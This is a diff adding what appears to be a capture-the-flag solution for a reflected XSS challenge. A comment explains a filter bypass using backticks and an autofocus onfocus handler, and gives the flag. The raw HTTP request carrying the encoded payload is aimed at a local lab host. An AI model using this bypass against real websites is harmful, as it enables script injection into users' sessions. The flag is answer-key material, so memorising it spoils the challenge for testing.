@@ -1,0 +1,4 @@
+# Reflected XSS via template literal (backtick) bypass. Single quotes filtered but backticks are not. Payload breaks out of value attribute, injects onfocus event handler with alert`XSS` to execute JavaScript. Returns flag{7b37c981-e7c9-4520-a486-8bbbfe90e9a6}
+
+GET /page?name=%22+onfocus%3D%22alert%60XSS%60%22+autofocus HTTP/1.1
+Host: 172.17.0.1:39855
